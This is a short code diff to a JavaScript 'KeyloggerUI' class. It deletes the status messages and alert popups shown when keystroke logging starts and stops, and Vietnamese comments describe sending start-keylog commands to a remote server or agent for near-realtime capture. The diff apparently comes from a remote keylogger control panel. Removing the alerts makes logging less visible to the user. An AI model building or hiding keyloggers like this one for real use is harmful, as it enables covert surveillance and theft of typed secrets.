@@ -80,8 +80,6 @@ class KeyloggerUI {
         }
 
         this.isLogging = true;
-        this.logSystem(">>> Keylogger STARTED...");
-        alert('started');
         
         // Gửi lệnh Start Keylog tới Server/Agent
         // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
@@ -97,8 +95,6 @@ class KeyloggerUI {
         if (!window.gateway) return;
 
         this.isLogging = false;
-        this.logSystem(">>> Keylogger STOPPED.");
-        alert('stopped');
         
         Logic.stopKeylog();
         
